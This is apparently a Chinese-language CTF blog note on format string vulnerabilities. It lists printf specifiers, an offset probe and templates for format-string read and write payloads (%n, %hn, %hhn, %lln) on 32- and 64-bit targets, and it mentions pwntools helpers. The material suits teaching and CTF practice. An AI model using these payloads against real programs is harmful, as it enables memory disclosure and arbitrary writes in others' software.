---
title: CTF | 格式化字符串漏洞
date: 2018-09-15 14:55:47
tags:
---
关于格式化字符串漏洞
<!-- more -->
常见的格式
```
%d - 十进制 
%s - 字符串
%x - 十六进制 
%c - 字符
%p - 指针
%n - 当前print的字符数
```

通过AAAA%x%x%x%x%x 测试偏移


```

32位

读

'%{}$x'.format(index)           // 读4个字节
'%{}$p'.format(index)           // 同上面
'${}$s'.format(index)
写

'%{}$n'.format(index)           // 解引用，写入四个字节
'%{}$hn'.format(index)          // 解引用，写入两个字节
'%{}$hhn'.format(index)         // 解引用，写入一个字节
'%{}$lln'.format(index)         // 解引用，写入八个字节

////////////////////////////
64位

读

'%{}$x'.format(index, num)      // 读4个字节
'%{}$lx'.format(index, num)     // 读8个字节
'%{}$p'.format(index)           // 读8个字节
'${}$s'.format(index)
写

'%{}$n'.format(index)           // 解引用，写入四个字节
'%{}$hn'.format(index)          // 解引用，写入两个字节
'%{}$hhn'.format(index)         // 解引用，写入一个字节
'%{}$lln'.format(index)         // 解引用，写入八个字节

%1$lx: RSI
%2$lx: RDX
%3$lx: RCX
%4$lx: R8
%5$lx: R9
%6$lx: 栈上的第一个QWORD
```
当然可以使用pwntools中的fmtstr_payload ，不用自己手工构造，但是理解还是很有必要的。
测试程序格式化字符串的偏移地址：FmtStr

